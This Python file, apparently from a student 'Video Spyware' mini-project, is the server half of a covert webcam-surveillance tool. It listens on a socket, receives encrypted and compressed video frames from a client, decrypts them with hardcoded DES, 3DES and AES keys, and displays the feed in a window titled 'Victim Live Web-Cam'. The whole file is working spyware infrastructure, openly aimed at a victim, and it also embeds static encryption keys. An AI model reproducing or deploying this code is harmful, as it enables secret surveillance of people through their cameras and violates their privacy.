# Gal Gabay 207006024
# Yechezkel Chen 325191419
# Mini-Project Video Spyware

import socket
import threading

# Image Processing
import cv2
import numpy as np

# Encryption
from base64 import b64decode
from Crypto.Cipher import DES, DES3, AES
from Crypto.Util.Padding import unpad

# Compress data
import zlib

HOST = socket.gethostbyname("localhost")
PORT = 5555

ENCRYPTION_ALGORITHMS = {
    0: (DES, DES.block_size, b'='),
    1: (DES3, DES3.block_size, b'='),
    2: (AES, AES.block_size, b'==')
}

DES_KEY = b'F3Ur482C'  # 8 bytes
DES3_KEY = b'vO287xbs77klAOhOlkhLDebh'  # 24 bytes
AES_KEY = b'QO7xGRbb46KZhcAZ'  # 16 bytes


class Server(threading.Thread):
    """
	A server class that connects to a video streaming client and receive video frames from him.
	"""

    def __init__(self, host: str, port: int, des_key: bytes, des3_key: bytes, aes_key: bytes):
        """
		Initialize the socket connection with the given host and port.

		:param host: The host for the socket connection.
		:type host: str
		:param port: The port for the socket connection.
		:type port: int
		:param des_key: The symmetric key of the DES encryption
		:type des_key: bytes
		:param des3_key: The symmetric key of the DES3 encryption
		:type des3_key: bytes
		:param aes_key: The symmetric key of the AES encryption
		:type aes_key: bytes
		"""
        threading.Thread.__init__(self)
        self.isRunning = False
        self.host = host
        self.port = port
        self.connected = False
        self.jpeg = None
        self.buff = 2048
        self.ci = None
        self.des_key = des_key
        self.des3_key = des3_key
        self.aes_key = aes_key

        self.sock = None

        self.setup_socket()

    def setup_socket(self):
        """
		Set up the socket for the connection.

		This method creates a new socket using the socket.AF_INET and socket.SOCK_STREAM address
		and socket families respectively.
		It sets the SO_REUSEADDR socket option to allow reuse of the host and port quickly after the connection is closed.
		Then the socket is binded to the given host and port.
		The method then prints a message indicating that it is listening for a connection on the specified host and port.
		It then listens for a single connection and, when a connection is made,
		it prints a message indicating a connection was made.
		"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))

        print("Listening for connection on host: {0}, port: {1}".format(str(self.host), str(self.port)))
        server_socket.listen(1)

        (client_socket, (self.host, self.port)) = server_socket.accept()
        print("Got connection from host: {0}, port: {1}".format(str(self.host), str(self.port)))
        self.sock = client_socket

    def run(self):
        """
		Receive from the client the cipher mode and get frames from him.
		This method receives encrypted video frames from a client over a socket connection,
		and send them to function 'decrypt_data'.
		the function decrypts the frames using one of three encryption methods
		(DES, DES3, AES) based on the cipher mode sent by the client.
		Then saves the decrypted frames as JPEG files.
		Additionally, it listens for a connection termination,
		and closes the socket connection when no data is received.
		"""
        self.isRunning = True

        # Set up the cipher mode
        ci = self.sock.recv(1024)
        if len(ci) == 0:
            print("No Cipher mode detected!")
            exit(0)

        if ci == b'0':
            print("Using DES...")
            key = self.des_key
            self.ci = 0
        elif ci == b'1':
            print("Using DES3...")
            key = self.des3_key
            self.ci = 1
        else:
            print("Using AES...")
            key = self.aes_key
            self.ci = 2

        # Receive frames
        t = b''  # temporary variable to store leftover data from previous frames
        while self.isRunning:  # Continuously receive frames as long as the program is running
            data = b''  # variable to store concatenated data
            while True:
                r = self.sock.recv(self.buff)  # receive data from the socket
                if len(r) == 0:  # check if the connection has been closed
                    self.isRunning = False
                    exit(0)
                end = r.find(b'END!')  # check if the end of the frame has been reached
                if end != -1:
                    data = t + data + r[:end]  # concatenate data and store in 'data' variable
                    t = r[end + 4:]  # store leftover data in 't' variable
                    break  # exit the inner-inner loop
                data += r  # if end of the frame is not reached, append received data to 'data' variable

            if not data:  # check if data is empty
                self.connected = False  # update the connection status
                break  # exit the inner loop

            decrypted_data = self.decrypt_data(data, key)  # decrypt the data using the key

            np_arr = np.frombuffer(decrypted_data, np.uint8)  # convert the decrypted data to a numpy array
            frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)  # decode the image using OpenCV
            ret, jpeg = cv2.imencode('.jpg', frame)  # encode the image as a JPEG

            self.jpeg = jpeg  # store the JPEG image
            self.connected = True  # update the connection status

        self.connected = False  # update the connection status
        self.sock.close()  # close the socket connection

    def decrypt_data(self, data, key):
        """
		Decrypt and decompress the data using the specified algorithm and key.

		:param data: The data to encrypt and compress.
		:type data: bytes
		:param key: The key to use for encryption.
		:type key: bytes
		:returns: The decrypted and decompressed data
		:rtype: bytes
		"""
        # Get the encryption algorithm, block size, and search value to use
        algorithm, block_size, search_value = ENCRYPTION_ALGORITHMS[self.ci]

        # Find the search value in the data
        x = data.find(search_value)
        # Extract the initialization vector
        iv = data[:x + len(search_value)]
        # Remove the initialization vector from the data
        data = data[x + len(search_value):]

        # Decompress the data
        data = zlib.decompress(data)

        # Create a cipher object using the algorithm, key and initialization vector
        cipher = algorithm.new(key, algorithm.MODE_CBC, b64decode(iv))

        # Decrypt the data and remove any padding
        return unpad(cipher.decrypt(b64decode(data)), block_size)

    def stop(self):
        self.isRunning = False

    def client_connected(self):
        return self.connected

    def get_jpeg(self):
        return self.jpeg.tobytes()


def main():
    """
	The main function of the program.
	It starts the server, continuously receives images,
	and displays them on the screen.
	"""
    server = Server(HOST, PORT, DES_KEY, DES3_KEY, AES_KEY)  # initialize the Streamer class
    server.start()  # start the server

    while True:  # continuously receive and display images
        if server.client_connected():  # check if the client is connected
            image = cv2.imdecode(np.frombuffer(server.get_jpeg(), np.uint8),
                                 cv2.IMREAD_COLOR)  # decode the received image
            cv2.imshow('Victim Live Web-Cam', image)  # display the image on the screen
            if cv2.waitKey(1) == ord('q') or cv2.getWindowProperty('Victim Live Web-Cam',cv2.WND_PROP_VISIBLE) < 1:  # wait for the 'q' key to be pressed
                cv2.destroyAllWindows()  # close all open windows
                server.stop()  # stop the server
                server.join()  # wait for the server thread to finish
                print("Connection closed")
                exit(0)  # exit the program


if __name__ == "__main__":
    main()
